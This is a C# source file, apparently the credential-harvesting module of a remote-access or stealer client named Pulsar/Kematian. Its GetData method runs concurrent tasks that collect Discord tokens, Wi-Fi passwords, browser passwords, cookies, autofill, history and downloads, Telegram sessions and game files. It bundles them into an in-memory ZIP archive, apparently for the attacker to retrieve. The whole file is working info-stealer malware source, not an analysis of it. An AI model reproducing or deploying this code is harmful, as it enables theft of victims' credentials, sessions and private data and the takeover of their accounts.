using Pulsar.Client.Kematian.Browsers;
using Pulsar.Client.Kematian.Discord;
using Pulsar.Client.Kematian.Wifi;
using Pulsar.Client.Kematian.Telegram;
using Pulsar.Client.Kematian.Games;
using System;
using System.Diagnostics;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian
{
    public class Handler
    {
        public static byte[] GetData(int timeoutInSeconds = 60)
        {
            CancellationTokenSource cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutInSeconds));
            try
            {
                return GetData(cts.Token);
            }
            finally
            {
                cts.Dispose();
            }
        }

        public static byte[] GetData(CancellationToken cancellationToken = default(CancellationToken))
        {
            byte[] data = null;
            MemoryStream memoryStream = new MemoryStream();
            try
            {
                ZipArchive archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true);
                try
                {
                    var retriever = new BrowsersRetriever();
                    var textMethods = new KeyValuePair<Func<string>, string>[]
                    {
                        new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord/tokens.txt"),
                        new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi/Wifi.txt"),
                        new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers/autofill.json"),
                        new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers/cookies_netscape.txt"),
                        new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers/downloads.json"),
                        new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers/history.json"),
                        new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers/passwords.json"),
                        new KeyValuePair<Func<string>, string>(TelegramRetriever.GetTelegramSessions, "Telegram/sessions.txt")
                    };

                    ConcurrentBag<Tuple<string, byte[]>> entryResults = new ConcurrentBag<Tuple<string, byte[]>>();

                    SemaphoreSlim semaphore = new SemaphoreSlim(Environment.ProcessorCount);
                    try
                    {
                        List<Task> tasks = new List<Task>();

                        foreach (var methodPair in textMethods)
                        {
                            tasks.Add(Task.Run(() =>
                            {
                                string path = methodPair.Value;
                                try
                                {
                                    semaphore.Wait(cancellationToken);
                                    try
                                    {
                                        cancellationToken.ThrowIfCancellationRequested();
                                        string content = methodPair.Key();
                                        if (!string.IsNullOrEmpty(content))
                                        {
                                            byte[] contentBytes = System.Text.Encoding.UTF8.GetBytes(content);
                                            entryResults.Add(new Tuple<string, byte[]>(path, contentBytes));
                                        }
                                    }
                                    finally
                                    {
                                        semaphore.Release();
                                    }
                                }
                                catch (OperationCanceledException)
                                {
                                    Debug.WriteLine($"Operation for {path} was canceled.");
                                    throw;
                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Error processing {path}: {ex.Message}");
                                }
                            }, cancellationToken));
                        }

                        tasks.Add(Task.Run(() =>
                        {
                            try
                            {
                                semaphore.Wait(cancellationToken);
                                try
                                {
                                    cancellationToken.ThrowIfCancellationRequested();
                                    var telegramFiles = TelegramRetriever.GetTelegramSessionFiles();
                                    foreach (var file in telegramFiles)
                                    {
                                        if (cancellationToken.IsCancellationRequested)
                                            break;

                                        entryResults.Add(new Tuple<string, byte[]>(file.Key, file.Value));
                                    }
                                }
                                finally
                                {
                                    semaphore.Release();
                                }
                            }
                            catch (OperationCanceledException)
                            {
                                Debug.WriteLine("Telegram file retrieval was canceled.");
                                throw;
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
                            }
                        }, cancellationToken));

                        tasks.Add(Task.Run(() =>
                        {
                            try
                            {
                                semaphore.Wait(cancellationToken);
                                try
                                {
                                    cancellationToken.ThrowIfCancellationRequested();
                                    var gameFiles = GamesRetriever.GetGameFiles();
                                    foreach (var file in gameFiles)
                                    {
                                        if (cancellationToken.IsCancellationRequested)
                                            break;

                                        entryResults.Add(new Tuple<string, byte[]>(file.Key, file.Value));
                                    }
                                }
                                finally
                                {
                                    semaphore.Release();
                                }
                            }
                            catch (OperationCanceledException)
                            {
                                Debug.WriteLine("Game file retrieval was canceled.");
                                throw;
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error processing game files: {ex.Message}");
                            }
                        }, cancellationToken));

                        try
                        {
                            Task.WhenAll(tasks).Wait(cancellationToken);
                        }
                        catch (AggregateException ae)
                        {
                            ae.Handle(ex =>
                            {
                                if (ex is OperationCanceledException)
                                {
                                    Debug.WriteLine("Operation was canceled.");
                                    return true;
                                }

                                Debug.WriteLine($"Unhandled exception: {ex.Message}");
                                return false;
                            });
                        }
                    }
                    finally
                    {
                        semaphore.Dispose();
                    }

                    foreach (var entryResult in entryResults)
                    {
                        string path = entryResult.Item1;
                        byte[] fileData = entryResult.Item2;

                        try
                        {
                            var zipEntry = archive.CreateEntry(path);
                            using (var entryStream = zipEntry.Open())
                            {
                                entryStream.Write(fileData, 0, fileData.Length);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error adding {path} to archive: {ex.Message}");
                        }
                    }
                }
                finally
                {
                    archive.Dispose();
                }

                data = memoryStream.ToArray();
            }
            finally
            {
                memoryStream.Dispose();
            }

            return data;
        }
    }
}